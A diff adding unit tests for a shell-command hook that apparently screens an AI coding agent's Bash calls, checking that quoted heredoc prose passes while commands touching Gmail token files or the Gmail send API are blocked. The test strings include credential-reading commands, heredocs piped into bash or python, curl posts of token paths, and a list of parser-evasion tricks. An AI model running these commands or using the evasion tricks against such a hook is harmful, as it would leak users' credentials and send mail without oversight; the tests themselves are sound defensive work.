@@ -507,6 +507,114 @@ class MailTokenRuleG(Base):
             self.allowed(cmd)
 
 
+class RuleGQuotedHeredocBodies(Base):
+    """Claude_Commandz issue 228: the body of a quoted heredoc is data, so prose in it (an apostrophe, a send path in a sentence) is not
+    word-split as shell and not read as a send. An interpreter, a shell or curl fed by a heredoc is still checked, and so is every
+    command line around it."""
+    D = "~/.config/afa/gmail"
+    SEND = "https://gmail.googleapis.com/gmail/v1/users/me/messages/send"
+
+    def test_the_repro_in_the_issue_passes(self):
+        self.allowed("gh issue create -R o/r --title t --body-file - <<'EOF'\nit's\nEOF")
+
+    def test_an_apostrophe_in_a_quoted_body_passes(self):
+        for body in ("it's", "the head's last bar", "a (b) c's d", "a ) b's", "a (b c", "don't \"quote\" me", "it's\nand 'that's' too"):
+            for tag in ("'EOF'", '"EOF"', "\\EOF"):
+                self.allowed("gh issue create -R o/r --title t --body-file - <<%s\n%s\nEOF" % (tag, body))
+
+    def test_the_hand_off_append_passes(self):
+        self.allowed("cat >> /tmp/hand-off.md <<'EOF'\nThe hub's note: it's done.\nEOF")
+        self.allowed("cat > /tmp/hand-off.md <<-'EOF'\n\tthe head's last bar\n\tEOF")
+
+    def test_a_prose_body_that_names_a_send_path_passes(self):
+        self.allowed("cat > /tmp/notes.md <<'EOF'\nThe tool never calls %s itself.\nEOF" % self.SEND)
+        self.allowed("gh issue create -R o/r --title t --body-file - <<'EOF'\nIt's refused when it names drafts/send or messages:send.\nEOF")
+        self.allowed("git commit -F - <<'EOF'\nrule G: don't refuse prose that says messages/send\nEOF")
+
+    def test_commands_around_the_body_are_still_checked(self):
+        for cmd in ("cat <<'EOF'\nit's\nEOF\ncat %s/token.json" % self.D,
+                    "cat <<'EOF'\nx\nEOF\ncurl -X POST %s" % self.SEND,
+                    "cat > %s/token.json <<'EOF'\nit's\nEOF" % self.D,
+                    "cat <<'EOF' > /tmp/x; cat %s/token.json\nit's\nEOF" % self.D,
+                    "cat <<'EOF'\nit's\nEOF\npython3 - <<'X'\nprint(1)\nX\ncat %s/client.json" % self.D):
+            self.blocked(cmd, "G")
+
+    def test_a_body_that_names_the_token_folder_is_still_refused(self):
+        self.blocked("cat > /tmp/notes.md <<'EOF'\nsee %s/token.json\nEOF" % self.D, "G")
+        self.blocked("cat > /tmp/notes.md <<'EOF'\nit's in ~/.config/afa/gmail\nEOF", "G")
+
+    def test_an_interpreter_or_curl_fed_by_a_heredoc_is_still_checked(self):
+        for cmd in ("python3 - <<EOF\nprint(open('%s/token.json').read())\nEOF" % self.D,
+                    "python3 - <<'EOF'\nprint(open('%s/token.json').read())\nEOF" % self.D,
+                    "python3 - <<'EOF'\nimport urllib.request as u; u.urlopen('%s')\nEOF" % self.SEND,
+                    "bash <<EOF\ncat %s/token.json\nEOF" % self.D,
+                    "bash <<'EOF'\ncurl -X POST %s\nEOF" % self.SEND,
+                    "sh <<\"EOF\"\ncat %s/token.json\nEOF" % self.D,
+                    "node - <<'EOF'\nrequire('fs').readFileSync('%s/token.json')\nEOF" % self.D,
+                    "curl --data @- https://example.org <<EOF\n%s/token.json\nEOF" % self.D,
+                    "curl -X POST --data @- %s <<'EOF'\n{}\nEOF" % self.SEND,
+                    "curl --data @- https://example.org <<'EOF'\nit's %s\nEOF" % self.SEND):
+            self.blocked(cmd, "G")
+
+    def test_a_body_piped_or_chained_into_something_that_runs_it_is_still_checked(self):
+        for cmd in ("cat <<'EOF' | bash\ncat %s/token.json\nEOF" % self.D,
+                    "cat <<'EOF' | sh\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' | python3 -\nprint(open('%s/token.json').read())\nEOF" % self.D,
+                    "cat <<'EOF' | xargs curl -X POST\n%s\nEOF" % self.SEND,
+                    "cat <<'EOF' && bash\ncat %s/token.json\nEOF" % self.D,
+                    "tee /tmp/run.sh <<'EOF' | bash\ncurl -X POST %s\nEOF" % self.SEND,
+                    "FOO=1 cat <<'EOF'\nit's %s\nEOF" % self.SEND,
+                    "/tmp/evil/cat <<'EOF'\nit's %s\nEOF" % self.SEND,
+                    "eval \"$(cat <<'EOF'\ncat %s/token.json\nEOF\n)\"" % self.D):
+            self.blocked(cmd, "G")
+
+    def test_the_blind_review_cases_are_refused(self):
+        """A terminator glued to the closing quote (bash ends the body at EOFx, not EOF), process substitution, a high file descriptor, sort."""
+        for cmd in ("cat <<'EOF'x\nEOFx\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<\"EOF\"x\nEOFx\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EO'F\nEOF\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<\\EO\\F\nEOF\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF'x\nEOFx\ntar czf /tmp/c.tgz ~/.config\nEOF",
+                    "cat <<'EOF' > >(bash)\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' | tee >(sh)\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' 2>&3\ncurl -X POST %s\nEOF" % self.SEND,
+                    "sort --compress-program=sh -S 1K <<'EOF'\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' >&10\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' >&$fd\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' > /dev/fd/3\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' > /proc/self/fd/3\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' &>/tmp/x\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' > \"/dev\"/fd/3\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' > /de''v/fd/3\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' > /de?/fd/3\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' > $target\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'EOF' >| /de?/fd/3\ncurl -X POST %s\nEOF" % self.SEND,
+                    "tee /de?/fd/3 <<'EOF'\ncurl -X POST %s\nEOF" % self.SEND,
+                    "tee \"$target\" <<'EOF'\ncurl -X POST %s\nEOF" % self.SEND,
+                    "tee /dev/fd/3 <<'EOF'\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat {fd}<<'EOF'\ncurl -X POST %s\nEOF" % self.SEND,
+                    "cat <<'E\\\\OF'\ncurl -X POST %s\nE\\OF" % self.SEND,
+                    "cat <<\"E\\\"OF\"\ncurl -X POST %s\nE\"OF" % self.SEND,
+                    "cat <<'E$OF'\ncurl -X POST %s\nE$OF" % self.SEND):
+            self.blocked(cmd, "G")
+
+    def test_the_unclear_cases_are_refused(self):
+        for cmd in ("cat <<'EOF'\ncurl -X POST %s" % self.SEND,                 # no terminator
+                    "echo \"<<'EOF'\"; cat %s/token.json\nEOF" % self.D,          # the operator sits inside a quote
+                    "cat \"x <<'EOF'\n\"; cat %s/token.json\nEOF" % self.D,
+                    "cat <<'EOF'; echo $(cat %s/token.json)\nit's\nEOF" % self.D,
+                    "echo $'it\\'s'; cat <<'EOF'\nx\nEOF\ncat %s/token.json" % self.D):
+            self.blocked(cmd, "G")
+
+    def test_main_exit_codes_for_the_repro_and_a_must_refuse_payload(self):
+        def run(cmd):
+            p = subprocess.run([sys.executable, HOOK], input=json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}}),
+                               capture_output=True, text=True, timeout=30)
+            return p.returncode
+        self.assertEqual(run("gh issue create -R o/r --title t --body-file - <<'EOF'\nit's\nEOF"), 0)
+        self.assertEqual(run("python3 - <<EOF\nprint(open('%s/token.json').read())\nEOF" % self.D), 2)
+
+
 class IssueNinetyThreeF7(Base):
     """The wrong refusal and the three gaps from workspace issue 93 (all values made up)."""
 
